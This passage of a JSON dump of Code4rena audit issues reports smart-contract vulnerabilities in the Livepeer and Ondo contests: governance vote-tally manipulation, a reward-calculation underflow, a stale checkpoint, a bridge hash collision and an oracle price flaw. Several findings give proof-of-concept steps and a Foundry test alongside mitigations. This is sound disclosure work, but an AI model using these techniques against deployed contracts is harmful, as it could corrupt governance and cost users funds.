code](https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L184)  ```solidity // @audit // is transcoder? bool isTranscoder = _account == delegate; ```  and does not match the logic that determine if the address is an registered transcorder and an active transcoder in the bondManager.sol  In BondManager.sol, the function that used to check if a transcoder is registered is in this [line of code](https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L1156)  ```solidity     /**      * @notice Return whether a transcoder is registered      * @param _transcoder Transcoder address      * @return true if transcoder is self-bonded      */     function isRegisteredTranscoder(address _transcoder) public view returns (bool) {         Delegator storage d = delegators[_transcoder];         return d.delegateAddress == _transcoder && d.bondedAmount > 0;     } ```  the function that used to check if a transcoder is active is in [this line of code](https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L1145)  ```solidity     function isActiveTranscoder(address _transcoder) public view returns (bool) {         Transcoder storage t = transcoders[_transcoder];         uint256 currentRound = roundsManager().currentRound();         return t.activationRound <= currentRound && currentRound < t.deactivationRound;     } ```  Missing the check the the delegator's bond amount (delegators[_transcoder].bondeAmount > 0)  the code incorrectedly count regular delegator as transcoder and does not update the deduction power correctedly  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  reuse the function isRegisteredTranscoder and isActiveTranscoder to determine if an account is a registered and active transcoder when counting the voting power   ## Assessed type  Governance"}, {"title": "ClaimRounds claims token pool shares until the current round, rather than until the end round.", "html_url": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/205", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "sufficient quality report", "edited-by-warden", "Q-04"], "target": "2023-08-livepeer-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L447-L457   # Vulnerability details  ## Impact  Claim Rounds claims pool token shares for the whole round rather than until the end round that the function caller specifies.  ## Proof of Concept  The `claimEarnings` function takes in an _endRound parameter. However, this parameter does not affect the round until which the rewards are claimed. Instead, rewards are claimed until the current round.  ```solidity     function claimEarnings(uint256 _endRound)         external         whenSystemNotPaused         currentRoundInitialized         autoCheckpoint(msg.sender)     {          _endRound;          _autoClaimEarnings(msg.sender);     } ```  This does not match the code comments which clearly state that the tokens should be claimed until the end round:  ``` @notice Claim token pools shares for a delegator from its lastClaimRound through the end round ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Use the `_endRound` parameter within the `claimEarnings` function and set it as the upper bound until which rewards are claimed.      ## Assessed type  Other"}, {"title": "Fully slashed transcoder can vote with 0 weight messing up the voting calculations", "html_url": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/194", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "sufficient quality report", "M-02"], "target": "2023-08-livepeer-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L181-L189   # Vulnerability details  ## Impact If a transcoder gets slashed fully he can still vote with 0 amount of `weight` making any other delegated user that wants to change his vote to subtract their `weight` amount from other delegators/transcoders.  ## Proof of Concept In `BondingManager.sol` any transcoder can gets slashed by a specific percentage, and that specific transcoder gets resigned and that specific percentage gets deducted from his `bondedAmount`  https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L394-L411 If any `bondedAmount` will remain then the penalty will also gets subtracted from the `delegatedAmount`, if not, nothing happens  https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L412-L417 After that the `penalty` gets burned and the fees gets paid to the finder, if that is the case  https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L420-L440 The problem relies in the fact that a fully slashed transcoder, even if it gets resigned, he is still seen as an active transcoder in the case of voting. Let's assume this case : - a transcoder gets fully slashed and gets resigned from the transcoder pools, getting his `bondedAmount` to 0, but he still has `delegatedAmount` to his address since nothing happens this variable https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L402-L418 - transcoder vote a proposal and when his weighting gets calculated here https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/f34a3a7e5a1d698d87d517fda698d48286310bee/contracts/governance/GovernorUpgradeable.sol#L581, it will use the `_getVotes` from `GovernorVotesUpgradeable.sol` https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/f34a3a7e5a1d698d87d517fda698d48286310bee/contracts/governance/extensions/GovernorVotesUpgradeable.sol#L55-L61 - `_getVotes` calls `getPastVotes` on `BondingVotes.sol` https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingVotes.sol#L167-L170 which returns the amount of weight specific to this transcoder and as you can see, because the transcoder has a `bondedAmount` equal to 0, the first if statement will be true and 0 will be returned https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingVotes.sol#L372-L373 - 0 weight will be passed into `_countVote` which will then be passed into `_handleVoteOverrides` https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L151 - then it will check if the caller is a transcoder, which will be true in our case, because nowhere in the `slashTranscoder` function, or any other function the transcoder `delegateAddress` gets changed, so this if statement will be true https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L182-L184, which will try to deduct the weight from any previous delegators https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L184-L189 - if any delegator already overridden any amount this subtraction would revert, but if that is not the case, 0 weight will be returned, which is then used to vote `for`, `against` , `abstain`, but since 0 weight is passed no changed will be made. - now the big problem arise, if any delegator that delegated their votes to this specific transcoder want to change their vote, when his weight gets calculated, `delegatorCumulativeStakeAt` gets called https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingVotes.sol#L459-L487 which will return most of the time his `bondedAmount`, amount which is greater than 0, since he didn't unbound. - because of that when `_handleVoteOverrides` gets called in `_countVote`, to override the vote, this if statement will be true, since the transcoder voted already, but with 0 weight https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L195 and the delegator weight gets subtracted from the support that the transcoder used in his vote - the system in this case expect the transcoder to vote with the whole `delegatedAmount`, which will make the subtraction viable, since the weight of the delegator should be included in the full `delegatedAmount` of that specific transcoder, but since the transcoder voted with 0 weight, the subtraction would be done from other delegators/transcoders votes. - also this can be abused by a transcoder by voting a category which he knows will not get a lot of votes, if let's say a transcoder used his 0 weight to vote for `abstain` and every other voter will vote on `for` or `against`, every time one of his delegators want to change the vote the subtraction can revert, which will force those delegators out of the vote, until they will change their transcoder  ## Tools Used Manual review ## Recommended Mitigation Steps If a transcoder gets fully slashed and resigned, delete his address from `delegateAddress` so he will not appear as a transcoder in the mechanism of counting the votes. If he still wants to participate in the system he can act as a delegator to another transcoder. Another solution would be to not let 0 weight votes happen anyways, since they don't modify the vote state at all.   ## Assessed type  Governance"}, {"title": "Underflow in updateTranscoderWithFees can cause corrupted data and loss of winning tickets.", "html_url": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/165", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "sufficient quality report", "H-01"], "target": "2023-08-livepeer-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-livepeer/blob/main/contracts/bonding/BondingManager.sol#L355   # Vulnerability details  ### Summary `updateTranscoderWtihFees` can underflow because MathUtils is used instead of PreciseMathUtils. ### Proof of Concept According to [LIP-92](https://github.com/livepeer/LIPs/blob/master/LIPs/LIP-92.md) the initial `treasuryRewardCutRate` will be set to `10%`. `treasuryRewardCutRate` is set with the `setTreasuryRewardCutRate()`function, which calls the internal function `_setTreasuryRewardCutRate()`.  ```javascript file: 2023-08-livepeer/contracts/bonding/BondingManager.sol  function _setTreasuryRewardCutRate(uint256 _cutRate) internal {         require(PreciseMathUtils.validPerc(_cutRate), \"_cutRate is invalid precise percentage\"); ```  In this function the value will be checked if it's a valid `PreciseMathUtils` percentage (<100% specified with 27-digits precision): ```javascript file: 2023-08-livepeer/contracts/libraries/PreciseMathUtils.sol library PreciseMathUtils { // ...     // Divisor used for representing percentages     uint256 public constant PERC_DIVISOR = 10**27;  function validPerc(uint256 _amount) internal pure returns (bool) {         return _amount <= PERC_DIVISOR;     } // ... ```  However, in `updateTranscoderWithFees`, to calculate `treasuryRewards`, `MathUtils` is used instead of `PreciseMathUtils`. ```javascript file: 2023-08-livepeer/contracts/bonding/BondingManager.sol  function updateTranscoderWithFees(         address _transcoder,         uint256 _fees,         uint256 _round     ) external whenSystemNotPaused onlyTicketBroker { // ... uint256 treasuryRewards = MathUtils.percOf(rewards, treasuryRewardCutRate); rewards = rewards.sub(treasuryRewards); // ... } ```  `MathUtils` uses a `PREC_DIVISOR` of `1000000` instead of `10 ** 27` from the `PreciseMathUtils`: ```javascript file: 2023-08-livepeer/contracts/libraries/MathUtils.sol library MathUtils { // ...     uint256 public constant PERC_DIVISOR = 1000000; // ... ```  This leads to `treasuryRewards` value being bigger than expected. Here is a gist of the POC: [POC](https://gist.github.com/bronzepickaxe/60063c47c327a1f2d4ee3dbd6361049b). Running the POC it shows that the current usage of `MathUtils` when calculating `treasuryRewards` will always cause an underflow in the next line of code.  `updateTranscoderWithFees` is called every time a winning ticket is redeemed . Whenever the transcoder has skipped the previous round reward call, this function has to re-calculate the rewards, as documented in [LIP-92](https://github.com/livepeer/LIPs/blob/master/LIPs/LIP-92.md?plain=1#L130) This re-calculation will always fail due to the underflow shown above.  ### Impact This will lead to accounting errors, unexpected behaviours and can cause a loss of winning tickets.  Firstly, the accounting errors and unexpected behaviours: these are all the storage values getting updated in `updateTranscoderWithFees`: ```javascript file: 2023-08-livepeer/contracts/bonding/BondingManager.sol  function updateTranscoderWithFees( address _transcoder,         uint256 _fees,         uint256 _round     ) external whenSystemNotPaused onlyTicketBroker { // ... // transcoder & earningsPool.data L314: Transcoder storage t = transcoders[_transcoder]; L321: EarningsPool.Data storage earningsPool = t.earningsPoolPerRound[currentRound];  //accounting updates happen here L377: t.cumulativeFees = t.cumulativeFees.add(transcoderRewardStakeFees)    .add(transcoderCommissionFees); L382: earningsPool.updateCumulativeFeeFactor(prevEarningsPool,delegatorsFees); L384: t.lastFeeRound = currentRound; ``` - Let `currentRound() - 1` be the previous round where the transcoder skipped the reward call - Let `currentRound()` be current round - Let `currentRound() + 1` be the next round  During `currentRound()` it wont be possible to update the `Transcoder` storage or `earningsPool.data` storage because of the underflow that will happen because `currentRound() - 1` reward call has been skipped by the transcoder.  During `currentRound() + 1` it will be possible to call `updateTranscoderWithFees`, however, L382 will only update the `prevEarningsPool`, which in this case will be `currentRound()`, not `currentRound - 1`. Therefor, the `EarningsPool.data.cumulativeRewardFactor` won't be updated for `currentRound() - 1`.  Lastly, the validity of a ticket is two rounds as per the [specs](https://github.com/livepeer/wiki/blob/master/spec/streamflow/pm.md?plain=1#L107). This means that a transcoder that receives a winning ticket in `currentRound() - 1` should be able to redeem it in `currentRound() - 1` and `currentRound()`. However, a transcoder that receives a winning ticket in `currentRound() - 1` wont be able to redeem it in `currentRound()` because of the underflow that happens while redeeming a winning ticket in `currentRound()`. The transcoder wont be able to redeem it after `currentRound + 1..N` because the ticket will be expired. ## Tools Used Manual Review ## Recommended Mitigation Steps Use `PreciseMathLib` instead of `MathLib`: ```javascript file: 2023-08-livepeer/contracts/bonding/BondingManager.sol  L355:  - uint256 treasuryRewards = MathUtils.percOf(rewards, treasuryRewardCutRate); + uint256 treasuryRewards = PreciseMathUtils.percOf(rewards, treasuryRewardCutRate); ```   ## Assessed type  Library"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/150", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-06"], "target": "2023-08-livepeer-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-livepeer-findings/blob/main/data/Proxy-Q.md)."}, {"title": "withdrawFees does not update checkpoint", "html_url": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/104", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "sufficient quality report", "M-03"], "target": "2023-08-livepeer-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-livepeer/blob/bcf493b98d0ef835e969e637f25ea51ab77fabb6/contracts/bonding/BondingManager.sol#L273-L277 https://github.com/code-423n4/2023-08-livepeer/blob/bcf493b98d0ef835e969e637f25ea51ab77fabb6/contracts/bonding/BondingManager.sol#L130-L133 https://github.com/code-423n4/2023-08-livepeer/blob/bcf493b98d0ef835e969e637f25ea51ab77fabb6/contracts/bonding/BondingManager.sol#L1667-L1671 https://github.com/code-423n4/2023-08-livepeer/blob/bcf493b98d0ef835e969e637f25ea51ab77fabb6/contracts/bonding/BondingManager.sol#L1500-L1552   # Vulnerability details  ## Impact BondingVotes may have stale data due to missing checkpoint in BondingManager#withdrawFees().  ## Proof of Concept The withdrawFee function has the autoClaimEarnings modifier: ```Solidity     function withdrawFees(address payable _recipient, uint256 _amount) external whenSystemNotPaused currentRoundInitialized autoClaimEarnings(msg.sender) { ``` which calls _autoClaimEarnings: ```Solidity modifier autoClaimEarnings(address _delegator) {         _autoClaimEarnings(_delegator);         _; ```  which calls updateDelegatorWithEarnings: ```Solidity function _autoClaimEarnings(address _delegator) internal {         uint256 currentRound = roundsManager().currentRound();         uint256 lastClaimRound = delegators[_delegator].lastClaimRound;         if (lastClaimRound < currentRound) {             updateDelegatorWithEarnings(_delegator, currentRound, lastClaimRound);         }     } ``` During updateDelegatorWithEarnings both delegator.lastClaimRound delegator.bondedAmount can be assigned new values. ```Solidity         del.lastClaimRound = _endRound;         // Rewards are bonded by default         del.bondedAmount = currentBondedAmount; ``` However during the lifecycle of all these functions _checkpointBondingState is never called either directly or throught the autoCheckpoint modifier resulting in lastClaimRound & bondedAmount's values being stale in BondingVotes.sol.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Add autoCheckpoint modifier to the withdrawFees function.   ## Assessed type  Other"}, {"title": "By delegating to a non-transcoder, a delegator can reduce the tally of somebody else's vote choice without first granting them any voting power", "html_url": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/96", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "sufficient quality report", "edited-by-warden", "H-02"], "target": "2023-08-livepeer-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L174-L212   # Vulnerability details  ## Impact  A delegate can subtract their own voting weight from the voting choice of another delegate, even if that user isn't a transcoder. Since they are not a transcoder, they don't have their votes initially increased by the amount delegated to them, voting weight is still subtracted from the tally of their vote choice.  Maliciously, this could be used to effectively double one's voting power, by delegating their votes to a delegator who is about to vote for the choice which they don't want. It can also occur accidentally, for example when somebody delegates to a transcoder who later switches role to delegate.  ## Proof of Concept  When a user is not a transcoder, their votes are determined by the amount they have delegated to the delegatedAddress, and does not increase when a user delegates to them:  ```solidity         if (bond.bondedAmount == 0) {             amount = 0;         } else if (isTranscoder) {             amount = bond.delegatedAmount;         } else {             amount = delegatorCumulativeStakeAt(bond, _round);         }     } ```  Lets that this delegator (Alice) has 100 votes and votes `For`, Then another delegator(Bob) has delegated 1000 votes to Alice As stated above, Alice doesn't get the voting power of Bob's 1000 votes, so the `For` count increases by 100.  Bob now votes, and `_handleVotesOverrides` is called. In this function, the first conditional, `if isTranscoder` will return false as Bob is not self-delegating.   Then, there is a check that the address Bob has delegated to has voted. Note that there is a missing check of whether the delegate address is a transcoder. Therefore the logic inside `if (delegateVoter.hasVoted)` is executed:  '''solidity     if (delegateVoter.hasVoted) {             // this is a delegator overriding its delegated transcoder vote,             // we need to update the current totals to move the weight of             // the delegator vote to the right outcome.             VoteType delegateSupport = delegateVoter.support;              if (delegateSupport == VoteType.Against) {                 _tally.againstVotes -= _weight;             } else if (delegateSupport == VoteType.For) {                 _tally.forVotes -= _weight;             } else {                 assert(delegateSupport == VoteType.Abstain);                 _tally.abstainVotes -= _weight;             }         } '''  The logic reduces the tally of whatever choice Alice voted for by Bob's weight. Alice initially voted `For` with 100 votes, and then the For votes is reduced by Bob's `1000 votes`. Lets say that Bob votes `Against`. This will result in an aggregate 900 vote reduction in the `For` tally and +1000 votes for `Agaisnt` after Alice and Bob has finished voting.  If Alice was a transcoder, Bob will be simply reversing the votes they had delegated to Alice. However since Alice was a delegate, they never gained the voting power that was delegated to her.  Bob has effectively gained the ability to vote against somebody else's votes (without first actually increasing their voting power since they are not a transcoder) and can vote themselves, which allows them to manipulate governance.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  There should be a check that a delegate is a transcoder before subtracting the tally. Here is some pseudocode:  ``` if (delegateVoter.hasVoted && ---delegate is transcoder ---) ```  This is an edit of the conditional of the function `_handleOverrides`. This ensures that the subtraction of vote tally is only performed when the delegate is a voter AND the delegate is a transcoder. This should fix the accounting/subtraction issue of vote tally for non-transcoder delegates.               ## Assessed type  Invalid Validation"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/86", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-07"], "target": "2023-08-livepeer-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-livepeer-findings/blob/main/data/rvierdiiev-Q.md)."}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/1", "labels": ["sponsor confirmed"], "target": "2023-08-livepeer-findings", "body": "# Agreements  **If you are a C4 Certified Contributor** by commenting or interacting with this repo prior to public release of the contest report, you agree that you have [read the Certified Warden docs](https://www.notion.so/code4rena/What-certified-wardens-can-should-do-06d1073540994cc08937f721c2951b0f) and agree to be bound by:  - [C4 Certified Contributor Terms and Conditions](https://github.com/code-423n4/code423n4.com/blob/main/_data/pages/certified-contributor-terms-and-conditions.md), - [C4 Code of Professional Conduct](https://www.notion.so/Code-of-Professional-Conduct-657c7d80d34045f19eee510ae06fef55), and - the disclosure guidelines below.  To signal your agreement to these terms, add a \ud83d\udc4d emoji to this issue.      Code4rena staff reserves the right to disqualify anyone from this role and similar future opportunities who is unable to participate within the above guidelines.  # Disclosures  Sponsors may elect to add team members and contractors to assist in sponsor review and triage. All sponsor representatives added to the repo should comment on this issue to identify themselves.  To ensure contest integrity, the following *potential* conflicts of interest should also be disclosed with a comment in this issue:   1. any sponsor staff or sponsor contractors who are also participating as wardens 2. any wardens hired to assist with sponsor review (and thus presenting sponsor viewpoint on findings) 3. any wardens who have a relationship with a judge that would typically fall in the category of potential conflict of interest (family, employer, business partner, etc) 4. any other case where someone might reasonably infer a possible conflict of interest."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-09-ondo-findings/issues/527", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "sufficient quality report", "Q-02"], "target": "2023-09-ondo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-09-ondo-findings/blob/main/data/gkrastenov-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-09-ondo-findings/issues/506", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "sufficient quality report", "Q-07"], "target": "2023-09-ondo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-09-ondo-findings/blob/main/data/Arz-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-09-ondo-findings/issues/502", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "sufficient quality report", "edited-by-warden", "Q-09"], "target": "2023-09-ondo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-09-ondo-findings/blob/main/data/adriro-Q.md)."}, {"title": "TWO DIFFERENT TRANSACTIONS CAN RESULT IN THE SAME `txnHash` VALUE THUS BREAKING THE APPROVAL PROCESS OF TRANSACTION MINTING", "html_url": "https://github.com/code-423n4/2023-09-ondo-findings/issues/391", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "sufficient quality report", "M-03"], "target": "2023-09-ondo-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L108-L109 https://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L137-L140 https://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L90-L91   # Vulnerability details  ## Impact  The `DestinationBridge._execute` is an internal function that is executed when contract is called by Axelar Gateway. The `_execute` function stores the `Transaction` struct in the `txnHashToTransaction` mapping as shown below:      bytes32 txnHash = keccak256(payload);     txnHashToTransaction[txnHash] = Transaction(srcSender, amt);   The transaction hash `txnHash` is calculated by `keccak256(payload)` and the `payload` is an `abi encoded` value consisting of following variables.      bytes32 version, address srcSender, uint256 amt, uint256 nonce  The issue here is that the two different `srcChains` with two different `srcAddr` contracts can end up providing the same `txnHash` if the above mentioned `version`, `srcSender`, `amt` and `nonce` are the same. The `_execute` function only restricts the same `srcAddr` to not to use the same `nonce` as shown below:      if (isSpentNonce[chainToApprovedSender[srcChain]][nonce]) {       revert NonceSpent();     }  But the problem is if there are different `srcAddr` providing the same `payload` it will result into the same `txnHash`.  Hence there could be two transactions with the same transaction hash (`txnHash`). Hence the later transaction will override the `txnToThresholdSet[txnHash]` of the former transaction. As a result the approval process for transaction minting will be broken.  ## Proof of Concept  ```solidity     bytes32 txnHash = keccak256(payload);     txnHashToTransaction[txnHash] = Transaction(srcSender, amt); ```  https://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L108-L109  ```solidity         txnToThresholdSet[txnHash] = TxnThreshold(           t.numberOfApprovalsNeeded,           new address[](0)         ); ```  https://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L137-L140  ```solidity     (bytes32 version, address srcSender, uint256 amt, uint256 nonce) = abi       .decode(payload, (bytes32, address, uint256, uint256)); ```  https://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L90-L91  ## Tools Used Manual Review and VSCode  ## Recommended Mitigation Steps  Hence it is recommended to include the `srcChain` and the `srcAddr` in the payload as well which is getting hashed to calculate the `txnHash`. By doing so different transactions coming from different `srcChains` and `srcAddr` will not result into the same `txnHash`. Hence the approval process for transaction minting via the bridge will successfully execute.   ## Assessed type  Other"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-09-ondo-findings/issues/354", "labels": ["bug", "G (Gas Optimization)", "grade-a", "high quality report", "selected for report", "sponsor confirmed", "G-15"], "target": "2023-09-ondo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-09-ondo-findings/blob/main/data/c3phas-G.md)."}, {"title": "Exponential Price Decrease could happen  in RWADynamicOracle Contract which will breakdown the accruing mechanism of rUSDY .", "html_url": "https://github.com/code-423n4/2023-09-ondo-findings/issues/194", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "high quality report", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2023-09-ondo-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-09-ondo/blob/47d34d6d4a5303af5f46e907ac2292e6a7745f6c/contracts/rwaOracles/RWADynamicOracle.sol#L151-L171   # Vulnerability details  ## vulnerability details The issue pertains to the formula used to calculate the price of the USDY token. As per the protocol's documentation, the price is expected to increase over time. However, the current formula results in an exponential decrease in price over time when the rate is below 1e27 .   the RWADynamicOracle uses this formula to get the current price of the USDY token  ``` currentPrice = (Range.dailyInterestRate ** (Days Elapsed + 1)) * Range.lastSetPrice ``` and the admin can set the DailyInterestRate of each range by passing the range informations to the function `setRange()` , but in this function there is no check that the `Range.dailyInterestRate` is greater than `1e27` which allow the admin (setter) to set the  `Range.dailyInterestRate`  to be less than 1e27 which will result in the price decrease  exponentially  so this will be a huge loss of funds for user which will loss there accumelated tokens and the value of their wrapped tokens will go down , and this is unexpected price because per documentation [here](https://code4rena.com/contests/2023-09-ondo-finance#top:~:text=the%20resulting%20plot%20should%20look%20identical%20to%20that%20of%20FIG%2D01) the price of USDY should always increase over time  so as shown in this [graph](https://www.desmos.com/calculator/w1yj3n1tqc) if the  `Range.dailyInterestRate` is less than `1e27` the curve of the price will decrease over the time , so this will cause loss of funds for all the users and this will break the accruing logic of the rUSDY. the `setRange()` function that allows the owner to set the rate to be less than 1e27.  https://github.com/code-423n4/2023-09-ondo/blob/47d34d6d4a5303af5f46e907ac2292e6a7745f6c/contracts/rwaOracles/RWADynamicOracle.sol#L151-L171 ```   function setRange(     uint256 endTimestamp,     uint256 dailyInterestRate   ) external onlyRole(SETTER_ROLE) {     Range memory lastRange = ranges[ranges.length - 1];       // Check that the endTimestamp is greater than the last range's end time     if (lastRange.end >= endTimestamp) revert InvalidRange();       uint256 prevClosePrice = derivePrice(lastRange, lastRange.end - 1);     ranges.push(       Range(lastRange.end, endTimestamp, dailyInterestRate, prevClosePrice)     );     emit RangeSet(       ranges.length - 1,       lastRange.end,       endTimestamp,       dailyInterestRate,       prevClosePrice     );   } ```    ## Impact the unexpected decreasing price will cause huge loss of fund for the users who wrapping their USDY tokens in the rUSDY contract . ## Proof of Concept  run this test that demonstrate the decreased price after some days of setting the daily interest rate to `0.8e27` , and see the logs that get emitted .  ```solidity // SPDX-License-Identifier: MIT pragma solidity 0.8.16;  import {Test, console2} from \"forge-std/Test.sol\"; import {RWADynamicOracle} from \"../../contracts/rwaOracles/RWADynamicOracle.sol\";  contract Mytest is Test {     uint256 public constant DAY = 1 days;     RWADynamicOracle oracle;     Range[] ranges;      uint256 constant RANGE_START = 1;     uint256 constant RANGE_END = 7 days;     uint256 constant LESS_THAN_ONE_RATE = 0.8e27;     uint256 constant START_PRICE = 1.01e18;      function setUp() external {         oracle =         new RWADynamicOracle(address(this),address(this),address(this) , RANGE_START , RANGE_END ,LESS_THAN_ONE_RATE,  START_PRICE );     }      function testGetThePrice() external {         vm.warp(block.timestamp + 5 days);         uint256 priceAfterFiveDays = oracle.getPrice();         console2.log(\"the initial price : \", START_PRICE);         console2.log(\"the price after 5 days with daily interest rate less than 1e27 : \", priceAfterFiveDays);         console2.log(\"the dalta price decreased  :\", START_PRICE - priceAfterFiveDays);     }  ```  the **logs** : ``` Logs:   the initial price :  1010000000000000000   the price after 5 days with daily interest rate less than 1e27 :  330956800000000000   the dalta price decreased  : 679043200000000000 ``` ## Tools Used foundry  ## Recommended Mitigation Steps add a check in the `setRange()` to make sure that the `dailyInterestRate` in greater than or equal 1e27  ```   function setRange(     uint256 endTimestamp,     uint256 dailyInterestRate   ) external onlyRole(SETTER_ROLE) {     Range memory lastRange = ranges[ranges.length - 1];       // Check that the endTimestamp is greater than the last range's end time     if (lastRange.end >= endTimestamp) revert InvalidRange(); +   if (dailyInterestRate < 1e27 ) revert();       uint256 prevClosePrice = derivePrice(lastRange, lastRange.end - 1);     ranges.push(       Range(lastRange.end, endTimestamp, dailyInterestRate, prevClosePrice)     );     emit RangeSet(       ranges.length - 1,       lastRange.end,       endTimestamp,       dailyInterestRate,       prevClosePrice     );   } ```      ## Assessed type  Math"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2023-09-ondo-findings/issues/1", "labels": ["sponsor confirmed"], "target": "2023-09-ondo-findings", "body": "# Agreements  **If you are a C4 Certified Contributor** by commenting or interacting with this repo prior to public release of the contest report, you agree that you have [read the Certified Warden docs](https://www.notion.so/code4rena/What-certified-wardens-can-should-do-06d1073540994cc08937f721c2951b0f) and agree to be bound by:  - [C4 Certified Contributor Terms and Conditions](https://github.com/code-423n4/code423n4.com/blob/main/_data/pages/certified-contributor-terms-and-conditions.md), - [C4 Code of Professional Conduct](https://www.notion.so/Code-of-Professional-Conduct-657c7d80d34045f19eee510ae06fef55), and - the disclosure guidelines below.  To signal your agreement to these terms, add a \ud83d\udc4d emoji to this issue.      Code4rena staff reserves the right to disqualify anyone from this role and similar future opportunities who is unable to participate within the above guidelines.  # Disclosures  Sponsors may elect to add team members and contractors to assist in sponsor review and triage. All sponsor representatives added to the repo should comment on this issue to identify themselves.  To ensure contest integrity, the following *potential* conflicts of interest should also be disclosed with a comment in this issue:   1. any sponsor staff or sponsor contractors who are also participating as wardens 2. any wardens hired to assist with sponsor review (and thus presenting sponsor viewpoint on findings) 3. any wardens who have a relationship with a judge that would typically fall in the category of potential conflict of interest (family, employer, business partner, etc) 4. any other case where someone might reasonably infer a possible conflict of interest."}, {"title": "QA 